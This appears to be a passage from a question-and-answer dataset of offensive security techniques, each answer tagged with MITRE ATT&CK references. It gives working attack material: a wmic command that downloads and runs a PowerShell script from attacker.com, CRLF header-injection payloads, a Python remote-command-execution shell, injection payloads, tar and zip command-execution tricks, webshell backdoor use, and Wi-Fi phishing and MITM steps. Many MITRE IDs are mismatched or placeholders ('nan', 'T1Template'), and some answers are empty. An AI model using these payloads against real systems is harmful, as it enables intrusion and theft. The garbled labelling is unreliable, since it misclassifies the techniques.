A: You can use the following Metasploit module to brute-force VMware systems:
msf> auxiliary/scanner/vmware/vmware_http_login
If you find valid credentials, you can use more Metasploit scanner modules to obtain additional information. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can VoIP Hopper be used to spoof CDP information and emulate a Cisco IP phone?
A: VoIP Hopper's -c 1 option enables CDP Spoof mode, which allows you to set various CDP attributes like Device ID, Port ID, Capabilities, Platform, Software, and Duplex. This can be used to emulate a Cisco IP phone and potentially gain unauthorized access to the network. For example: voiphopper -i eth0 -c 1 -E 'SEP00070EEA5086' -P 'Port 1' -C Host -L 'Cisco IP Phone 7940' -S 'P003-08-8-00' -U 1 MITRE References: MITRE ID is T1201, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What are some techniques that can be used to bypass regex filters on firewalls?
A: Different techniques can be used to bypass the regex filters on the firewalls. Examples include alternating case, adding line breaks, and encoding payloads. Resources for the various bypasses can be found at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) and [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). MITRE References: MITRE ID is T1620, MITRE Name is: Bypass Security Controls, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass web application firewalls using charset encoding?
A: Charset encoding can be used to bypass web application firewalls. Examples include using encodings like 'ibm037' or 'ibm500' in the Content-Type header or URL encoding payloads using those encodings. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: What techniques can be used to obfuscate payloads and bypass web application firewalls?
A: Techniques for obfuscating payloads to bypass web application firewalls include using Unicode compatibility characters and exceeding size limitations in the WAF. For example, characters that share Unicode compatibility may be able to bypass the WAF and execute the intended payload. Additionally, if the payload is larger than the maximum size checked by the WAF, it may bypass the filters. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can WCE be used to obtain NTLM hashes from memory on a Windows system?
A: WCE v1.3beta can be used to obtain NTLM hashes from memory on a Windows system without injecting code. It can read and decrypt information stored in Windows internal memory structures to extract LM/NT hashes, which can then be used to authenticate to other systems using pass-the-hash techniques. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can WCE be used to perform pass-the-hash attacks on Windows systems?
A: WCE v1.3beta can be used to perform pass-the-hash attacks on Windows systems natively. It allows you to list logon sessions and add, change, list, and delete associated credentials (e.g., LM/NT hashes), which can then be used to authenticate to other systems without needing the plaintext password. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: Lateral Movement, Execution.

## Q: How can you weaponize a Distroless container to execute arbitrary binaries and payloads?
A: The goal of weaponizing a distroless container is to be able to execute arbitrary binaries and payloads even with the limitations implied by distroless (lack of common binaries in the system) and also protections commonly found in containers such as read-only or no-execute in /dev/shm. This can be achieved through abusing existing binaries like openssl that are frequently found in these containers. MITRE References: MITRE ID is T1211, MITRE Name is: System Services, and MITRE Tactics are: Execution.

## Q: How can webacoo be used to establish a remote 'terminal' connection to a compromised system?
A: To establish a remote 'terminal' connection using webacoo version 0.2.3, you can use the following steps:1. Run `webacoo -t -u <URL>` to initiate the remote terminal connection. Replace `<URL>` with the URL of the backdoor on the compromised system.2. You can then execute commands on the remote system by using the `-e <CMD>` option, where `<CMD>` is the command you want to run.This allows you to interact with the compromised system and execute commands through the webacoo backdoor. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can webacoo be used to generate a backdoor with a custom PHP system function?
A: To generate a backdoor with a custom PHP system function using webacoo version 0.2.3, you can use the following steps:1. Run `webacoo -g -f <FUNCTION> -o <OUTPUT>` to generate the backdoor code. Replace `<FUNCTION>` with the desired PHP system function (1-5) and `<OUTPUT>` with the output filename.2. The available PHP system functions are:   - 1: system   - 2: shell_exec   - 3: exec   - 4: passthru   - 5: popenThis allows you to generate a backdoor that uses a specific PHP system function to execute commands on the target system. MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: Execution.

## Q: How can WebScarab be used to perform HTTPS man-in-the-middle attacks?
A: With version 20200519-d22bd60-0kali1, WebScarab can be used to perform HTTPS man-in-the-middle (MITM) attacks. To do this, launch WebScarab and navigate to the 'Proxy' tab. Enable the HTTPS proxy and configure it to listen on a specific IP address and port. Next, configure your target web browser to use the WebScarab proxy. WebScarab will then intercept and inspect all HTTPS traffic to and from the target application, allowing you to view, modify, and replay requests and responses as part of your security assessment. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion, Credential Access.

## Q: How can webshells be used for remote code execution and backdoors?
A: Webshells are scripts that can be uploaded to web servers to allow remote execution of commands. The webshells in the /usr/share/webshells directory can be used to achieve remote code execution and establish backdoors on web servers. For example, you can upload the php-reverse-shell.php webshell to a web server and then connect to it to gain a reverse shell. This gives you remote command execution on the server. (Version 1.1+kali8) MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Persistence, Privilege Escalation, Defense Evasion.

## Q: How can webshells be used to scan internal networks from a compromised server?
A: The webshells in /usr/share/webshells can be used to scan internal networks from a compromised server. For example, you can upload the php-findsock-shell.php webshell which listens for connections and can be used to pivot to other systems on the internal network. This allows you to gather information about the internal environment from the perspective of the compromised server. (Version 1.1+kali8) MITRE References: MITRE ID is T1210, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Lateral Movement, Collection.

## Q: How can you perform a MitM attack against websocket connections?
A: If you find that clients are connected to a **HTTP websocket** from your current local network you could try an [ARP Spoofing Attack](/generic-methodologies-and-resources/pentesting-network#arp-spoofing) to perform a MitM attack between the client and the server.
Once the client is trying to connect to you can then use:

```
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
``` MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: Lateral Movement, Command and Control.

## Q: How can Websploit be used to perform an MITM attack and intercept traffic between a client and server?
A: Websploit can be used to perform Man-In-The-Middle (MITM) attacks and intercept traffic between a client and server. Here's how:

1. Start the Websploit framework by running the 'websploit' command as root.
2. In the Websploit console, use the 'use mitm/arp_poisoning' command to select the ARP poisoning MITM module.
3. Set the GATEWAY option to the IP address of the default gateway on the network.
4. Set the TARGET option to the IP address of the client system you want to intercept.
5. Run the attack by using the 'run' command.

Websploit will then use ARP poisoning to divert traffic between the client and gateway through the attacking system, allowing you to intercept and potentially modify the traffic.

This can be a powerful technique for stealing credentials, intercepting sensitive data, or performing further attacks on the client or server systems. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion, Credential Access.

## Q: How can arbitrary files be exfiltrated from a WebView?
A: The exfiltration of arbitrary files can be demonstrated using an XMLHttpRequest:```var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() {    if (xhr.readyState == XMLHttpRequest.DONE) {        alert(xhr.responseText);    }}xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);xhr.send(null);``` MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: TA0009.

## Q: How can you use Python to execute commands on a remote server with RCE vulnerability?
A: To exploit a remote code execution (RCE) vulnerability on a server using Python, you can use the following approach:```pythonimport requestsimport refrom cmd import Cmdclass Terminal(Cmd):    prompt = "Inject => "    def default(self, args):        output = RunCmd(args)        print(output)def RunCmd(cmd):    data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }    r = requests.post('http://10.10.10.127/select', data=data)    page = r.text    m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)    if m:        return m.group(1)    else:        return 1    term = Terminal()term.cmdloop()```This code sets up a basic command-line interface using the `cmd` module, and the `RunCmd()` function is responsible for sending the malicious payload to the server and extracting the command output.The payload is constructed by adding the command to execute between `echo -n "MYREGEXP"` and `echo -n "MYREGEXP2"`. This allows us to use regular expressions to extract the command output from the server's response.When the `Terminal` class is instantiated and the `cmdloop()` method is called, it will present a prompt where you can enter commands to be executed on the remote server. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can Wfuzz be used to perform a login form bruteforce attack?
A: To perform a login form bruteforce attack with Wfuzz, you can use the following examples:

**POST, Single list, filter string (hide):**

wfuzz -c -w users.txt --hs "Login name" -d "name=FUZZ&password=FUZZ&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php

This filters the response by hiding the string "Login name" to only show valid login attempts.

**POST, 2 lists, filter code (show):**

wfuzz.py -c -z file,users.txt -z file,pass.txt --sc 200 -d "name=FUZZ&password=FUZ2Z&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php

This uses two wordlists, one for usernames and one for passwords, and filters the response by showing only the 200 status code responses, indicating a successful login. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can Wfuzz be used to perform directory and file bruteforce attacks?
A: To perform directory and file bruteforce attacks with Wfuzz, you can use the following example:

wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ

This uses the directory wordlist from the Dirbuster project and filters the responses to only show the whitelisted HTTP status codes, indicating valid directories or files. MITRE References: MITRE ID is T1592, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: Reconnaissance.

## Q: How can Wfuzz be used to perform header and cookie bruteforce attacks?
A: To perform header and cookie bruteforce attacks with Wfuzz, you can use the following examples:

**Cookie, filter code (show), proxy:**

wfuzz -c -w users.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "Cookie:id=1312321&user=FUZZ" "http://example.com/index.php"

This bruteforces the "user" cookie parameter, filtering the response to show only those containing the string "Welcome".

**User-Agent, filter code (hide), proxy:**

wfuzz -c -w user-agents.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "User-Agent: FUZZ" "http://example.com/index.php"

This bruteforces the User-Agent header, hiding responses that don't contain the string "Welcome". MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can Wfuzz be used to perform path parameter bruteforce attacks?
A: To perform path parameter bruteforce attacks with Wfuzz, you can use the following example:wfuzz -c -w ~/git/Arjun/db/params.txt --hw 11 'http://example.com/path%3BFUZZ=FUZZ'This uses the Arjun parameter wordlist and looks for responses with 11 words, which could indicate a valid parameter. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you inject malicious content through the Host header?
A: %0d%0aLocation:%20http://attacker.com
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E MITRE References: MITRE ID is T1095, MITRE Name is: Ingress Tool Transfer, and MITRE Tactics are: Lateral Movement.

## Q: What are some payloads that can be used for SQL injection?
A: {{7*7}}[7*7]
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/ MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What are some techniques to bypass 2FA/OTP?
A: nan MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can Weevely be used as a web shell to manage legitimate web accounts?
A: Weevely v4.0.1 can be used as a stealthy web shell to manage legitimate web accounts, even free hosted ones, for post-exploitation. After generating a PHP backdoor with the `weevely generate` command and a password, you can connect to the backdoor using the `weevely http://target/weevely.php password` command. This allows you to browse the filesystem, execute commands, and access the web server as the user that the web shell is running as. MITRE References: MITRE ID is T1505, MITRE Name is: Webshell, and MITRE Tactics are: Persistence, Execution, Command and Control.

## Q: How can you use Responder to perform a man-in-the-middle (MITM) attack and capture network credentials during a penetration test?
A: Responder is a tool used to perform MITM attacks and capture network credentials, such as NT hashes, HTTP/S credentials, and more. It works by poisoning the target's ARP cache and responding to various network service requests (e.g., LLMNR, NBT-NS, MDNS) with spoofed responses, tricking the victim into connecting to the attacker's system. This allows Responder to intercept and capture the victim's authentication attempts, which can then be used to gain unauthorized access to the network or systems. MITRE References: MITRE ID is T1556, MITRE Name is: Modification of Authentication Process, and MITRE Tactics are: Credential Access.

## Q: How can you bypass a PIN-protected Werkzeug / Flask Debug console?
A: If the `/console` endpoint is protected by a PIN, you can try to exploit a file traversal vulnerability to leak the necessary information to generate the PIN. This includes gathering `probably_public_bits` like the username, module name, and file path, as well as `private_bits` like the MAC address and machine ID. With this information, you can execute a script to hash the data and produce the correct PIN to unlock the console. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Credential Access.

## Q: How can you use wifi-honey to create a fake WiFi access point to capture handshake information from clients attempting to connect?
A: To create a fake WiFi access point with wifi-honey and capture handshake information, follow these steps:

1. Run `airmon-ng check kill` to stop any processes that may interfere with monitor mode.
2. Use `wifi-honey FreeWiFi 6 wlan0` to broadcast the ESSID "FreeWiFi" on channel 6 using the wireless interface wlan0.
3. Run airodump-ng alongside wifi-honey to capture the first two packets of the 4-way handshake from clients connecting to the fake AP.
4. You can then attempt to crack the WPA/WPA2 key using aircrack-ng or coWPAtty. MITRE References: MITRE ID is T1587, MITRE Name is: Develop Capabilities, and MITRE Tactics are: Resource Development.

## Q: How can wifiphisher be used to perform a phishing attack against a Wi-Fi network?
A: To conduct a phishing attack using wifiphisher, you can follow these steps:1. Set up the rogue access point with a convincing SSID (e.g. `--essid "Free WiFi"`)2. Choose a phishing scenario to present to victims (e.g. `--phishingscenario firmware_upgrade`)3. Optionally, add WPA/WPA2 protection to the rogue AP with a pre-shared key (`--presharedkey s3cr3tp4ssw0rd`)4. Monitor the attack for successful credential captures that are logged to a fileThis will create a fake wireless network and redirect victims to a phishing page, potentially tricking them into revealing their network password or other sensitive information. The tool automates much of the process compared to manual phishing techniques. MITRE References: MITRE ID is T1Template, MITRE Name is: Template for Analysis, and MITRE Tactics are: Initial Access, Credential Access.

## Q: How can wifiphisher be used to perform a deauthentication attack against a Wi-Fi network?
A: wifiphisher can be used to carry out deauthentication attacks against Wi-Fi networks with the following steps:1. Specify the interface to use for the deauthentication attack (`--extensionsinterface wlan1`)2. Optionally, target a specific ESSID for deauthentication (`--deauth-essid "MyWiFi"`)3. Optionally, specify the channels to deauthenticate on (`--deauth-channels 1,3,7`)4. Run wifiphisher without any phishing scenario (`--nodeauth`)This will continuously deauthenticate clients from the target network, potentially disrupting service or allowing further attacks like man-in-the-middle. The deauthentication can be used in conjunction with other wifiphisher features like phishing or Lure10. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How can the wifipumpkin3 tool be used for a man-in-the-middle attack?
A: The wifipumpkin3 tool can be used to conduct a man-in-the-middle attack by creating a rogue access point. The `wifipumpkin3` command can be used to start the framework and select the wireless interface to use for creating the rogue AP. This allows the attacker to intercept and monitor network traffic passing through the rogue AP. Version 1.1.7 includes features like `captiveflask` for creating a captive portal, `evilqr3` for serving malicious QR codes, and `phishkin3` for hosting external phishing pages. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can the sslstrip3 tool be used to perform a SSL/TLS downgrade attack?
A: The sslstrip3 tool can be used to perform a SSL/TLS downgrade attack. The `sslstrip3` command can be run with the `-s` or `-a` options to log all SSL/TLS and HTTP traffic to and from the server. This allows the attacker to intercept encrypted traffic and potentially downgrade the connection to use weaker or insecure protocols. Version 0.9 includes features like response tampering, session hijacking, and HTML injection to facilitate the attack. MITRE References: MITRE ID is T1030, MITRE Name is: Data Transfer Size Limits, and MITRE Tactics are: Exfiltration.

## Q: How can wifite2 version 2.7.0 be used to perform a WPS attack on wireless networks with strong signal strength?
A: To perform a WPS attack on wireless networks with strong signal strength using wifite2 version 2.7.0, you can use the following command:  

`wifite -pow 50 -wps`

This will target access points with a signal strength of at least 50 dB and use the WPS attack to attempt to crack the wireless network. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: TA0006.

## Q: How can you execute arbitrary commands using the "tar" command?
A: You can execute arbitrary commands using "tar" by creating files with the following content:

```
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

You can exploit this using the [wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) tool. More info in the [Exploiting Wildcards in Linux](https://www.exploit-db.com/papers/33930) paper. MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: TA0004, Execution.

## Q: How can you execute arbitrary commands using the "zip" command?
A: You can execute arbitrary commands using the "zip" command by using the "--unzip-command" option. For example:

```
zip name.zip files -T --unzip-command "sh -c whoami"
``` MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: TA0004, Execution.

## Q: How can you use PowerShell for privilege escalation on a Windows system?
A: PowerShell can be a powerful tool for privilege escalation on Windows systems. Pentester can use PowerShell cmdlets to enumerate system information, search for sensitive files or credentials, and even execute code with elevated privileges. Some examples of PowerShell commands that can be used for privilege escalation include Get-ChildItem, Get-Content, and Invoke-Command. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can the wmic tool be used for privilege escalation on a Windows system?
A: The wmic tool can be used to execute arbitrary commands on a remote Windows system with the permissions of the authenticated user. This can potentially be leveraged for privilege escalation if the user has access to sensitive resources or commands. For example, the following command can be used to execute a reverse shell on the remote system: wmic /node:target.domain.com /user:domain\user%pass process call create "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\"" MITRE References: MITRE ID is T1047, MITRE Name is: Windows Management Instrumentation, and MITRE Tactics are: Execution, Lateral Movement, Privilege Escalation.

## Q: How can the wmis tool be used to extract sensitive information from a Windows system?
A: The wmis tool can be used to query the Windows Management Instrumentation (WMI) service on a remote system and extract various types of sensitive information. For example, the following command can be used to retrieve a list of running processes and their associated user accounts: wmis -U domain\user%pass //target.domain.com "SELECT * FROM Win32_Process". This information could potentially be used for further privilege escalation or lateral movement within the target network. MITRE References: MITRE ID is T1047, MITRE Name is: Windows Management Instrumentation, and MITRE Tactics are: Discovery, Credential Access.

## Q: How can the rockyou.txt wordlist be used for password cracking or brute-force attacks?
A: The rockyou.txt wordlist is a popular password list containing over 14 million common passwords. It can be used with tools like John the Ripper, Hashcat, or Hydra to perform password cracking attacks against hashed passwords or brute-force attacks against web logins. For example, to use rockyou.txt with John the Ripper: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use wpa-sycophant version 1.0+git20210103-0kali3 to perform wireless network attacks?
A: To use wpa-sycophant version 1.0+git20210103-0kali3 for wireless network attacks, you can run the following command:```sudo wpa_sycophant -c /etc/wpa-sycophant/wpa_sycophant_example.conf -i wlan0```This will start the wpa-sycophant tool and use the example configuration file to relay phase 2 authentication attempts to access the corporate wireless network. You will need to set up a rogue access point beforehand to capture legitimate user connections, which can then be relayed to the Sycophant tool to gain unauthorized access. MITRE References: MITRE ID is T1498, MITRE Name is: Network Denial of Service, and MITRE Tactics are: TA0040 - Impact.

## Q: How can wpscan be used to perform password attacks against a WordPress site?
A: wpscan version 3.8.25 can be used to perform password attacks against a WordPress site. To do this, run the following command:
wpscan --url http://wordpress.local -P /path/to/password/list.txt
This will attempt to brute force the WordPress login using the provided password list. Alternatively, you can use the --usernames option to specify a list of usernames to try as well. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can an attacker leverage the wsgidav server to perform directory traversal attacks?
A: An attacker can attempt directory traversal attacks against the wsgidav server by crafting malicious WebDAV requests that include special characters or directory paths to access files outside of the intended root directory. This could allow an attacker to read sensitive files on the server. Version 4.3.0 of wsgidav is vulnerable to this type of attack without proper security configurations. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: TA0006.

## Q: How can an attacker use wsgidav to perform file injection attacks on a web application?
A: By abusing the WebDAV functionality of the wsgidav server, an attacker could potentially upload malicious files to the server and have them executed by a web application. This could allow the attacker to achieve remote code execution on the target system. Versions of wsgidav prior to 4.3.0 may be vulnerable to such file injection attacks without proper access controls and input validation. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: TA0007, TA0011.

## Q: How can Xprobe2 be used to perform active OS fingerprinting and bypass firewall/IDS detection?
A: Xprobe2 version 0.3-5 can be used for active OS fingerprinting in a way that remains usable even if intermediate systems like firewalls or routers make slight modifications to the packets. To bypass firewall or IDS detection, you can use the '-p <proto:portnum:state>' option to specify a port number, protocol, and state (e.g. 'tcp:23:open'). This allows Xprobe2 to better evade detection while still effectively fingerprinting the target OS. Additionally, the '-t <time_sec>' option can be used to set the initial receive timeout or roundtrip time, which may help bypass time-based detection. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Discovery, and MITRE Tactics are: Discovery.

## Q: How can xspy be used to sniff keystrokes on a remote or local X-Windows server?
A: xspy can be used to sniff keystrokes on a remote or local X-Windows server. To use xspy, run the command "xspy" without any arguments. This will open a connection to the default X display and start capturing keystrokes. The captured keystrokes will be printed to the console. Note that xspy requires the "libc6" and "libx11-6" dependencies to be installed. The version of xspy used in this example is 1.1-1kali4. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Collection.

## Q: How can Yersinia be used to perform VLAN hopping attacks?
A: Yersinia can be used to conduct VLAN hopping attacks by exploiting vulnerabilities in the VLAN Trunking Protocol (VTP). With Yersinia v0.8.2, you can use the 'yersinia vtp' command to launch VTP attacks like VTP name/password guessing, malformed VTP messages, and VTP domain name spoofing. These attacks can allow an attacker to gain unauthorized access to other VLANs on the network. MITRE References: MITRE ID is T1207, MITRE Name is: Rogue Domain Controller, and MITRE Tactics are: Privilege Escalation, Lateral Movement.

## Q: How can Yersinia be used to perform a Spanning Tree Protocol (STP) based attack?
A: Yersinia v0.8.2 includes modules to conduct various STP-based attacks. You can use the 'yersinia stp' command to launch attacks like BPDU manipulation, root bridge spoofing, and BPDU flooding. These attacks can allow an attacker to alter the spanning tree topology, cause network disruptions, and potentially gain unauthorized access to network segments. MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Persistence, Lateral Movement.

## Q: How can the zd1211-firmware be used in a penetration testing scenario?
A: The zd1211-firmware can be used to enable wireless connectivity for USB wireless dongles based on the ZyDAS ZD1211, ZD1211B, or Atheros AR5007UG chipsets. This can be useful in penetration testing scenarios where you need to establish a wireless connection to assess the security of a target network. The firmware is commonly used with the zd1211rw Linux kernel driver to provide wireless functionality. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Defense Evasion, Initial Access.

## Q: How can the zd1211-firmware be used in a CTF event to gain network access?
A: In a CTF event, the zd1211-firmware can be used to enable wireless connectivity for USB wireless dongles based on the supported chipsets. This can allow you to connect to the target network and potentially discover and exploit vulnerabilities. The firmware can be used with the zd1211rw Linux kernel driver to establish a wireless connection and gain network access. However, it is important to only use this in an authorized and ethical manner during CTF events, as unauthorized access to networks could be illegal. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Defense Evasion, Initial Access.

